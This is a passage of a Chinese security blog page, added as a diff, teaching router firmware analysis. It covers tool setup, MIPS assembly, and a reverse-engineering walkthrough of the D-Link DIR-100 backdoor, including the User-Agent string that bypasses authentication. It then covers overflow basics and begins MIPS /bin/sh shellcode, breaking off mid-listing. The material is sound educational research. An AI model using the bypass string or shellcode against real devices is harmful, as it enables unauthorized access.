@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>路由器固件安全分析技术(一) | 物联网安全技术研究</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+  
+  
+  <meta name="description" content="文章转载自：漏洞盒子原文作者：lzl@TCC原文链接：https://www.vulbox.com/knowledge/detail/?id=35">
+<meta property="og:type" content="article">
+<meta property="og:title" content="路由器固件安全分析技术(一)">
+<meta property="og:url" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-一/index.html">
+<meta property="og:site_name" content="物联网安全技术研究">
+<meta property="og:description" content="文章转载自：漏洞盒子原文作者：lzl@TCC原文链接：https://www.vulbox.com/knowledge/detail/?id=35">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-一/1498205156636.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-一/1498205368844.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-一/14982054337685.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-一/14982055759845.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-一/14982056684523.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-一/14982057419858.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-一/14982057841064.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-一/14982058212617.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-一/14982058625887.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-一/14982059585240.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-一/14982060682879.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-一/14982061673331.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-一/14982062006814.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-一/14982062532734.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-一/14982063045813.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-一/14982063369557.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-一/14982063654436.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-一/14982063961678.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-一/14982064611821.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-一/14982065398438.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-一/1498206710357.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-一/14982066375651.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-一/14982067813666.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-一/14982068387713.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-一/14982068741928.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-一/14982068997405.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-一/14982069797635.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-一/14982070565118.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-一/14982071275093.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-一/14982071625103.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-一/14982072171339.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-一/14982072686950.png">
+<meta property="og:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-一/14982072916043.png">
+<meta property="og:updated_time" content="2017-09-27T06:00:17.645Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="路由器固件安全分析技术(一)">
+<meta name="twitter:description" content="文章转载自：漏洞盒子原文作者：lzl@TCC原文链接：https://www.vulbox.com/knowledge/detail/?id=35">
+<meta name="twitter:image" content="http://yoursite.com/2017/09/27/路由器固件安全分析技术-一/1498205156636.png">
+  
+    <link rel="alternate" href="/atom.xml" title="物联网安全技术研究" type="application/atom+xml">
+  
+  <link rel="icon" href="/css/images/favicon.ico">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
+    
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+  <link rel="stylesheet" href="/css/style.css">
+
+  <script src="/js/jquery-3.1.1.min.js"></script>
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css" >
+  <link rel="stylesheet" href="/css/hiero.css" >
+  <link rel="stylesheet" href="/css/glyphs.css" >
+  
+    <link rel="stylesheet" href="/css/vdonate.css" >
+  
+
+</head>
+
+<script>
+var themeMenus = {};
+
+  themeMenus["/主页"] = "Home"; 
+
+  themeMenus["/书籍"] = "books"; 
+
+  themeMenus["/工具"] = "tools"; 
+
+  themeMenus["/关于我们"] = "About"; 
+
+</script>
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  <header id="allheader" class="site-header" role="banner">
+  <div class="clearfix container">
+      <div class="site-branding">
+
+          <h1 class="site-title">
+            
+              <a href="/" title="物联网安全技术研究" rel="home"> 物联网安全技术研究 </a>
+            
+          </h1>
+
+          
+            <div class="site-description">一个专注于物联网安全技术研究与交流的小站</div>
+          
+            
+          <nav id="main-navigation" class="main-navigation" role="navigation">
+            <a class="nav-open">Menu</a>
+            <a class="nav-close">Close</a>
+            <div class="clearfix sf-menu">
+
+              <ul id="main-nav" class="nmenu sf-js-enabled">
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/主页">Home</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/书籍">books</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/工具">tools</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/关于我们">About</a> </li>
+                    
+              </ul>
+            </div>
+          </nav>
+
+
+      </div>
+  </div>
+</header>
+
+
+
+
+  <div id="container">
+    <div id="wrap">
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-路由器固件安全分析技术-一" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" class="article-title" itemprop="name">
+      路由器固件安全分析技术(一)
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	Posted on <a href="/2017/09/27/路由器固件安全分析技术-一/" class="article-date">
+	  <time datetime="2017-09-27T05:31:02.000Z" itemprop="datePublished">September 27, 2017</time>
+	</a>
+
+      
+	<span id="busuanzi_container_page_pv">
+	  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+	</span>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>文章转载自：漏洞盒子<br>原文作者：lzl@TCC<br>原文链接：<a href="https://www.vulbox.com/knowledge/detail/?id=35" target="_blank" rel="external">https://www.vulbox.com/knowledge/detail/?id=35</a><br><a id="more"></a></p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文可作为路由器安全的入门学习教程，一起学习从零基础从搭建环境开始入门路由器固件安全分析的技术。</p>
+<h1 id="搭建环境篇"><a href="#搭建环境篇" class="headerlink" title="搭建环境篇"></a>搭建环境篇</h1><p><em>演示系统</em>：debian 3.16.0-4-686-pae</p>
+<p>本篇重在演示路由器固件分析及运行环境，而对于工具各参数将不详细阐述其用法，这里只要能够成功搭建起来即可。<br>由于binwalk，qemu等工具目前只能在linux环境下运行，又比如需要wine运行32位IDA程序。故综合各方面，建议安装32位debian发行版本。<br>在安装各工具及依赖前更新/etc/apt/source.list，<br>添加一行：deb <a href="http://us.archive.ubuntu.com/ubuntu" target="_blank" rel="external">http://us.archive.ubuntu.com/ubuntu</a> saucy main universe<br>接着sudo apt-get update。<br>以及安装build-essential：sudo apt-get install build-essential<br>它能够解决安装过程的复杂的依赖问题。</p>
+<h2 id="IDA-pro"><a href="#IDA-pro" class="headerlink" title="IDA pro"></a>IDA pro</h2><p>由于路由器提取的根文件系统有符号链接，在Windows下容易造成符号链接丢失,故在linux中安装IDA Pro,同时linux原生版本的IDA pro网上的版本过旧，所以采取wine运行Windows IDA Pro。安装wine，通过在终端输入如下命令：</p>
+<pre><code>sudo apt-get install wine
+</code></pre><p>选择在/opt目录下新建目录ida将Windows IDA Pro下所有文件一概都拷贝到该文件夹下。<br><img src="/2017/09/27/路由器固件安全分析技术-一/1498205156636.png" alt=""></p>
+<p>同时idaq.exe和idaq64.exe均为32位可执行文件，这里也是安装32位Debian的原因。</p>
+<p>由于后续会使用到IDA Pro的IDAPython插件，故还需要下载<a href="https://www.dllme.com/dll/download/14091/python27.dll%EF%BC%88%E8%AF%A5%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80%E6%9D%A5%E6%BA%90%E4%BA%8E%E7%BD%91%E7%BB%9C%EF%BC%89%EF%BC%8C%E5%B9%B6%E6%94%BE%E7%BD%AE%E5%88%B0ida%E6%A0%B9%E7%9B%AE%E5%BD%95%E4%B8%8B%E3%80%82%E5%90%8C%E6%97%B6%E5%90%AF%E5%8A%A8idaq.exe%E4%BB%A5%E5%A6%82%E4%B8%8B%E6%96%B9%E5%BC%8F%E5%90%AF%E5%8A%A8%EF%BC%9A%60export" target="_blank" rel="external">python27.dll</a>,并放到ida根目录下。同时以如下方式启动idaq.exe:</p>
+<pre><code>export PYTHONPATH=/usr/lib/python2.7 &amp;&amp; wine idaq
+</code></pre><p>当然可以写入/usr/bin中，以该脚本方式启动。<br><img src="/2017/09/27/路由器固件安全分析技术-一/1498205368844.png" alt=""></p>
+<p>最后，对路由器分析还需要一些IDA插件的支持，git下载<br>    git clone <a href="https://github.com/devttys0/ida.git" target="_blank" rel="external">https://github.com/devttys0/ida.git</a><br>将整个目录中的py文件拷贝到/opt/ida/plugins中。此时启动后能够看到插件的生效如MIPS ROP Finder。<br><img src="/2017/09/27/路由器固件安全分析技术-一/14982054337685.png" alt=""></p>
+<h2 id="Binwalk"><a href="#Binwalk" class="headerlink" title="Binwalk"></a>Binwalk</h2><p>如kali中安装带有BinWalk，但是由于缺少依赖依赖，故无法对固件进行解包，先使用git进行下载：<br>    git clone <a href="https://github.com/devttys0/binwalk.git" target="_blank" rel="external">https://github.com/devttys0/binwalk.git</a><br>此时，仅可以对固件进行简单的扫描操作。<br><img src="/2017/09/27/路由器固件安全分析技术-一/14982055759845.png" alt=""></p>
+<p>安装依赖可以通过binwalk根目录下的INSTALL.md依次进行安装或者以root身份运行deps.sh。通过执行binwalk -Me 固件文件作为判断依赖是否安装成功的依据。<br><img src="/2017/09/27/路由器固件安全分析技术-一/14982056684523.png" alt=""></p>
+<h2 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h2><p>qemu为模拟处理器的软件，通过git进行下载：</p>
+<pre><code>git clone git://git.qemu-project.org/qemu.git。
+</code></pre><p>进入qemu下载目录。执行如下命令</p>
+<pre><code>git submodule update --init pixman
+git submodule update --init dtc
+sudo apt-get install libglib2.0
+sudo apt-get install libglib2.0-dev
+sudo apt-get install autoconf automake libtool
+</code></pre><p>成功后进行配置并编译安装：</p>
+<pre><code>sudo ./configure --static&amp;&amp;sudo make&amp;&amp;sudo make install。
+</code></pre><p>对某固件bin目录下非符号链接的文件进行file命令，判断其指令集类型。<br>tophant@debian:~/IOT/backdoor/_w30xr_v3.1.201c_cn.bin.extracted/_40.extracted/_ramdisk.extracted/squashfs-root/bin$ file busybox busybox: ELF 32-bit LSB executable, MIPS, MIPS-II version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped<br>说明为mips小端格式（little endian），小端格式也可见固件分析篇一节。在提取文件系统的bin目录中直接执行qemu-mipsel ls，将会报找不到库文件的错误。这其实是因为需要定位根目录到提取出文件系统的根目录中。<br><img src="/2017/09/27/路由器固件安全分析技术-一/14982057419858.png" alt=""></p>
+<p>在binwalk提取的文件系统中执行命令如下：</p>
+<pre><code>tophant@debian:~/IOT/backdoor/_w30xr_v3.1.201c_cn.bin.extracted/_40.extracted/_ramdisk.extracted/squashfs-root$ cp $(which qemu-mipsel) ./
+tophant@debian:~/IOT/backdoor/_w30xr_v3.1.201c_cn.bin.extracted/_40.extracted/_ramdisk.extracted/squashfs-root$ sudo chroot . ./qemu-mipsel /bin/ls
+</code></pre><p>将qemu-mispel拷贝到当前目录，为更改执行目录做准备，之后接着执行ls命令，可以看到能够将mipsel指令集的ls运行起来了。<br><img src="/2017/09/27/路由器固件安全分析技术-一/14982057841064.png" alt=""></p>
+<h2 id="交叉编译环境"><a href="#交叉编译环境" class="headerlink" title="交叉编译环境"></a>交叉编译环境</h2><p>后续过程中，涉及到编译编写存在漏洞的mips可执行文件及编写mips可用的shellcode，故需要在linux上搭建交叉编译环境。</p>
+<pre><code>wget http://buildroot.uclibc.org/downloads/snapshots/buildroot-snapshot.tar.bz2
+tar -jxvf buildroot-snapshot.tar.bz2
+</code></pre><p>完成下载及解压后，执行如下命令。</p>
+<pre><code>cd buildroot
+sudo apt-get install libncurses5-dev patch
+make clean
+make menuconfig
+</code></pre><p>出现如下界面<br><img src="/2017/09/27/路由器固件安全分析技术-一/14982058212617.png" alt=""></p>
+<p>以MIPS小端格式为例，进入target options-&gt;target architecture选择mips（little endian），target options-&gt;target architecture variant设置为MIPS。<br><img src="/2017/09/27/路由器固件安全分析技术-一/14982058625887.png" alt=""></p>
+<p>进入toolchain将kernel headers中将其改为对应机器的内核版本。<br><img src="/2017/09/27/路由器固件安全分析技术-一/14982059585240.png" alt=""></p>
+<p>由于测试机为3.16，故修改为低于此版本的headers。<br><img src="/2017/09/27/路由器固件安全分析技术-一/14982060682879.png" alt=""></p>
+<p>执行sudo make进行编译，成功后在buildroot目录的/output/host/usr/bin下出现mipsel-linux-gcc。<br>同样，可以编写hello world程序使用mipsel-linux-gcc进行编译后，使用qemu-mipsel进行运行，其中mipsel-linux-gcc用法与gcc一致，读者可以自行运行一下。</p>
+<h2 id="系统环境网络配置"><a href="#系统环境网络配置" class="headerlink" title="系统环境网络配置"></a>系统环境网络配置</h2><p>之前，已经通过qemu成功执行了一个mips程序，qemu还有一种模拟整个系统的模式。现在配置qemu虚拟机中的网络环境。</p>
+<pre><code>sudo apt-get install uml-utilities bridge-utils
+</code></pre><p>后续步骤来源于参考资料，未能掌握这样配置的原因，但暂且按部就班进行操作。<br>向/etc/network/interfaces添加如下内容：</p>
+<pre><code>auto lo
+iface lo inet loopback
+auto eth0
+iface eth0 inet manual
+up ifconfig eth0 0.0.0.0 up
+auto br0
+iface br0 inet dhcp
+bridge_ports eth0
+bridge_stp off
+bridge_maxwait 1
+</code></pre><p>在/etc/qemu-ifup中写入如下内容：</p>
+<pre><code>#!/bin/sh
+echo &quot;executing /etc/qemu-ifup&quot;
+echo &quot;bringing up $1 for bridged mode...&quot;
+sudo /sbin/ifconfig $1 0.0.0.0 promisc up
+echo &quot;adding $1 to br0...&quot;
+sudo /sbin/brctl addif br0 $1
+sleep 2
+</code></pre><p>保存退出后使用chmod a+x为其加上可执行属性。<br>输入sudo service networking restart重启网络使设置生效。<br>sudo ifdown eth0&amp;sudo ifup br0。<br>此时演示环境的网络情况如下：<br><img src="/2017/09/27/路由器固件安全分析技术-一/14982061673331.png" alt=""></p>
+<p>现在，需要下载内核文件和磁盘镜像。进入people.debian.org/~aurel32/qemu/即可，小端格式MIPS则为下载vmlinux-2.6.32-5-4kc-malta和debian_squeeze_mipsel_standard.qcow2。<br>执行如下命令。</p>
+<pre><code>sudo qemu-system-mipsel -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console==ttyS0&quot; -net nic,macaddr=00:10:10:10:10:10 -net tap -nographic
+</code></pre><p>进入后默认密码为root/root，登录后编辑/etc/network/interfaces，加入如下内容：</p>
+<pre><code>auto lo
+iface lo inet loopback
+# The primary network interface
+allow-hotplug eth1
+iface eth1 inet dhcp
+</code></pre><p>ifup eth1启用eth1接口，现在mips虚拟机网络信息如下图。<br><img src="/2017/09/27/路由器固件安全分析技术-一/14982062006814.png" alt=""></p>
+<p>至此，常用的路由器固件分析工具均已搭建且配置完毕。</p>
+<h1 id="指令分析篇"><a href="#指令分析篇" class="headerlink" title="指令分析篇"></a>指令分析篇</h1><p>为了不在分析固件的过程中，避免反复说明同一类问题的情况，本篇将会把涉及的mips汇编指令及特性等相关内容进行汇总加以说明。<br>目前，路由器多为使用mips32指令集的linux，掌握mips32汇编在逆向分析路由器固件中显得格外重要。总体来说，其属于risc精简指令集，每条指令为4字节定长。</p>
+<h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>mips32中存在32个通用寄存器，每个寄存器长度均为32位，具体可见下表。<br><img src="/2017/09/27/路由器固件安全分析技术-一/14982062532734.png" alt=""></p>
+<p>除了通用寄存器，还有几个特殊寄存器\$pc（程序计数器），\$hi（乘法高位存放，除法余数存放），\$lo（乘法低位存放，除法商存放）。</p>
+<h2 id="常见指令"><a href="#常见指令" class="headerlink" title="常见指令"></a>常见指令</h2><h3 id="mips32指令编码类型"><a href="#mips32指令编码类型" class="headerlink" title="mips32指令编码类型"></a>mips32指令编码类型</h3><pre><code>1 6bit 操作码+5bit源操作数+5bit第二源操作数+5bit目的操作数+5bit位移量+6bit函数码
+2 6bit操作码+5bit源操作数+5bit第二源操作数+16bit立即数
+3 6bit操作码+26bit地址
+</code></pre><h3 id="算术类"><a href="#算术类" class="headerlink" title="算术类"></a>算术类</h3><p>因为受到risc指令定长的影响，对于mips32来说所有操作数不能使用内存寻址方式。对于add(i)(u)/sub(i)(u)加减类操作使用3个操作数，对于使用立即数的运算立即数大小不能超过16bit的表示。div/mul指令由于结果保存在特殊寄存器\$hi和\$lo中，所以使用2个操作数即可。</p>
+<h3 id="load-store类"><a href="#load-store类" class="headerlink" title="load/store类"></a>load/store类</h3><p>load对应其汇编指令中l开头的指令如lb,lw,la等等，作用为将寻址内容或是立即数读入寄存器。相应地，store为s开头如sb,sw等等将制定长度内容存入内存地址中。</p>
+<h3 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h3><p>均为无条件跳转。j target为跳转到target表示的地址，jr \$reg如jr \$ra常常被用于函数返回，jal target代表junp and link将下一指令位置存入\$ra并跳转到$ra。 其使用（3）型指令，故可以寻址26bit地址即256mb。</p>
+<h3 id="分支跳转指令"><a href="#分支跳转指令" class="headerlink" title="分支跳转指令"></a>分支跳转指令</h3><p>b target无条件跳转到target，beq \$reg1,\$reg2,target为\$reg1=\$reg2时跳转到target。同样地，beq后的eq可以被替换包括lt（小于）,le（小于等于）,ne（不等于）,ge（大于等于）,gt（大于）。</p>
+<h3 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h3><p>完成系统调用，\$v0存放系统调用号，一般情况下，\$a0-\$a3存放参数，系统调用返回时\$v0存放返回值，如若出错则在\$a3中存放错误编号。</p>
+<h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><h3 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h3><p>包括立即数寻址，寄存器寻址，寄存器相对寻址（寄存器和16位立即数相加后寻址），pc相对寻址：pc寄存器和16位立即数左移2位后运算寻址。</p>
+<h3 id="内存表示方法"><a href="#内存表示方法" class="headerlink" title="内存表示方法"></a>内存表示方法</h3><p>正如环境搭建出现的mipsel（little-endian）,这里以举例方式来说明。如0x12345678早大端和小端方式存放的区别。从低地址到高地址表示大端存放字节为0x12,0x34,0x56,0x78，小端方式从低地址到高地址为0x780x56,0x34,0x12。</p>
+<h3 id="流水线特性"><a href="#流水线特性" class="headerlink" title="流水线特性"></a>流水线特性</h3><p>也被称为分支延迟槽 ，与时钟周期等有关，如jal在完成函数调用前jal的后一条指令已经被执行。</p>
+<h1 id="后门分析篇"><a href="#后门分析篇" class="headerlink" title="后门分析篇"></a>后门分析篇</h1><p>本节将通过逆向分析一个实际路由器后门漏洞问题，在此同时巩固指令分析篇的知识2014-02-10,CNCERT在<a href="http://www.cert.org.cn/publish/main/9/2014/20140429121938383684464/20140429121938383684464_.html" target="_blank" rel="external">http://www.cert.org.cn/publish/main/9/2014/20140429121938383684464/20140429121938383684464_.html</a>一文中通报了多个路由器的后门漏洞，其中包括D-LINK路由器的一个后门漏洞。<br><img src="/2017/09/27/路由器固件安全分析技术-一/14982063045813.png" alt=""></p>
+<p>固件可以通过<a href="ftp://ftp.dlink.eu/Products/dir/dir-100/driver_software/DIR-100_fw_reva_113_ALL_en_20110915.zip" target="_blank" rel="external">ftp://ftp.dlink.eu/Products/dir/dir-100/driver_software/DIR-100_fw_reva_113_ALL_en_20110915.zip</a>进行下载。<br>首先，需要将固件的文件系统提取出来，使用环境搭建中安装的binwalk工具进行提取。<br>输入命令：binwalk -Me DIR100_v5.0.0EUb3_patch02.bix<br>其中-e代表根据配置文件从固件中提取文件系统，-M代表根据进行递归提取。</p>
+<p>成功提取后，进入提取文件系统目录的bin目录下。同时，由于该后门的描述为：<em>攻击者通过修改User-Agent 值为“xmlset_roodkcableoj28840ybtide”（没有引号）即可绕过路由器Web认证机制取得后台管理权限</em>。故推测该后门与路由器的web server程序有关，在该目录下对文件名作为简单的判断依据，故对webs文件进行逆向分析。</p>
+<p>根据file命令得知其为大端mips32格式的可执行文件。</p>
+<pre><code>tophant@debian:~/IOT/backdoor/_DIR100_v5.0.0EUb3_patch02.bix.extracted/squashfs-root/bin$ file webs``webs: ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
+</code></pre><p>根据公告信息得知，在IDA Pro字符串窗口搜索字符串：<br>xmlset_roodkcableoj28840ybtide。<br><img src="/2017/09/27/路由器固件安全分析技术-一/14982063369557.png" alt=""></p>
+<p>根据交叉引用位置发现该字符串被出现在alpha_auth_check函数中。<br><img src="/2017/09/27/路由器固件安全分析技术-一/14982063654436.png" alt=""></p>
+<p>可以看到这个字符串和$s0+0xd0处内容当strcmp匹配成功，则会v1=1，转入loc_423edc。<br><img src="/2017/09/27/路由器固件安全分析技术-一/14982063961678.png" alt=""></p>
+<p>这里也就是check成功的返回值。也就是之前设置的1。<br><img src="/2017/09/27/路由器固件安全分析技术-一/14982064611821.png" alt=""></p>
+<p>而s0就是a0，传递的第一个参数。<br><img src="/2017/09/27/路由器固件安全分析技术-一/14982065398438.png" alt=""></p>
+<p>依次向上找调用处。<br><img src="/2017/09/27/路由器固件安全分析技术-一/1498206710357.png" alt=""><br><img src="/2017/09/27/路由器固件安全分析技术-一/14982066375651.png" alt=""><br><img src="/2017/09/27/路由器固件安全分析技术-一/14982067813666.png" alt=""></p>
+<p>函数简化的为调用流程httpd_parse_request-&gt;alpha_httpd_parse_request-&gt;alpha_auth_check。在httpd_parse_request中看到结构体0xd0偏移处 的设置。这里对应user-agent域的内容。这里验证了确实是user-agent为该值进行验证。<br><img src="/2017/09/27/路由器固件安全分析技术-一/14982068387713.png" alt=""></p>
+<p>继续看上层函数会判断alpha_auth_check返回值与-1的值。同时注意这里延迟槽的处理。<br><img src="/2017/09/27/路由器固件安全分析技术-一/14982068741928.png" alt=""></p>
+<p>成功传入http_request_t*内容等调用do_xgi处理请求<br><img src="/2017/09/27/路由器固件安全分析技术-一/14982068997405.png" alt=""></p>
+<p>验证不通过则重定向到/public/login.htm。<br><img src="/2017/09/27/路由器固件安全分析技术-一/14982069797635.png" alt=""></p>
+<p>这一步验证了为该特殊值通过验证不会被重定向到登录页面的情况。最终确定该后门漏洞细节与描述一致。</p>
+<h1 id="漏洞利用基础篇"><a href="#漏洞利用基础篇" class="headerlink" title="漏洞利用基础篇"></a>漏洞利用基础篇</h1><h2 id="基本溢出原理"><a href="#基本溢出原理" class="headerlink" title="基本溢出原理"></a>基本溢出原理</h2><p>本篇将介绍如何编写基础功能的shellcode中的payload，如ctf pwn中常常会使用到的执行/bin/sh。因本篇做基础技术介绍，至于其他更为复杂的payload编写及实际二进制漏洞利用将在后续依次介绍。</p>
+<p>mips与x86函数调用存在比较大的差别，从如下几点进行描述。</p>
+<p>叶子函数：内部不再调用其他函数的函数称为叶子函数，相反称为非叶子函数。</p>
+<p>先来分析如超过4个参数传递的非叶子函数调用。</p>
+<p>高地址到低地址依次为当前函数的寄存器备份和局部变量，参数x-参数1（参数4-参数1预留），当前函数返回用的地址，调用函数的寄存器备份及局部变量。。。。。。依次类推。叶子函数和非叶子函数根据之前的描述可知其决定如何返回到上层函数。故讨论覆盖返回地址问题时需要分开讨论。<br><img src="/2017/09/27/路由器固件安全分析技术-一/14982070565118.png" alt=""></p>
+<p>由于这里的non_leaf会调用strcpy所以其是一个非叶子函数，可以看到var_4位置是返回\$ra存放的位置。而var_20是strcpy的目的地址，这里存在栈溢出漏洞是可以覆盖掉var_4控制返回地址 的。</p>
+<p>对于叶子函数，这类情况返回地址不会暂存在栈中，所以其通过$ra进行函数返回。此时就需要满足溢出空间足够，来覆盖上层函数存放返回地址的区域，因为上层函数必定是一个非叶子函数。</p>
+<h2 id="基本payload编写方法"><a href="#基本payload编写方法" class="headerlink" title="基本payload编写方法"></a>基本payload编写方法</h2><p>在mips32-linux的payload编写，不可避免的使用到syscall系统调用。正如固件分析篇中所描述的，\$v0作为系统调用号，$a0-\$a3作为传递参数。</p>
+<p>首先，不同系统调用对应不同的系统调用号及参数，故需要完成确定系统调用号的工作。为了确定系统号，进入使用者的buildroot目录（为搭建环境中的交叉编译安装目录）,如进入/home/tophant/buildroot/output/build/linux-headers-3.12.74/usr/include/asm，查看unistd.h头文件，演示的对应大端mips-libnux的头文件，不过对于小端mips-linux来说应该保持一致。如下为该 文件的简单片段。</p>
+<pre><code>Linux o32 style syscalls are in the range from 4000 to 4999.
+#define __NR_Linux 4000
+#define NR_syscall (NR_Linux + 0)
+#define NR_exit (NR_Linux + 1)
+#define NR_fork (NR_Linux + 2)
+#define NR_read (NR_Linux + 3)
+#define NR_write (NR_Linux + 4)
+#define NR_open (NR_Linux + 5)
+#define NR_close (NR_Linux + 6)
+#define NR_waitpid (NR_Linux + 7)
+#define NR_creat (NR_Linux + 8)
+#define NR_link (NR_Linux + 9)
+#define NR_unlink (NR_Linux + 10)
+......
+#define NR_prlimit64 (NR_Linux + 338)
+#define NR_name_to_handle_at (NR_Linux + 339)
+#define NR_open_by_handle_at (NR_Linux + 340)
+#define NR_clock_adjtime (NR_Linux + 341)
+#define NR_syncfs (NR_Linux + 342)
+#define NR_sendmmsg (NR_Linux + 343)
+#define NR_setns (NR_Linux + 344)
+#define NR_process_vm_readv (NR_Linux + 345)
+#define NR_process_vm_writev (NR_Linux + 346)
+#define NR_kcmp (NR_Linux + 347)
+#define NR_finit_module (NR_Linux + 348)
+</code></pre><p>可知，对于mips32来说syscall的功能号范围为4000到4348。比如#define NR_execve (NR_Linux + 11)代表execve的调用号为4011。那么，现在便动手编写一个运行linux shell的payload，对应linux中的函数为execve。首先通过man查看该函数的简要说明，以便确定系统调用时的参数。</p>
+<pre><code>execve - execute program
+SYNOPSIS
+#include
+int execve(const char filename, char const argv[],char *const envp[]);
+</code></pre><p>可知，只需要向filename填充”/bin/sh”来完成，argv,envp填写NULL即可。<br>如下为使用mips32汇编语言编写的代码。</p>
+<pre><code>.section .text
+.globl shellcode_execve
+.set noreorder
+shellcode_execve:
+    addiu \$sp,\$sp,-32
+    jal alpha
+    nop
+alpha:
+    addiu \$a0,\$ra,20
+    li \$a1,0
+    li \$a2,0
+    li \$v0,4011
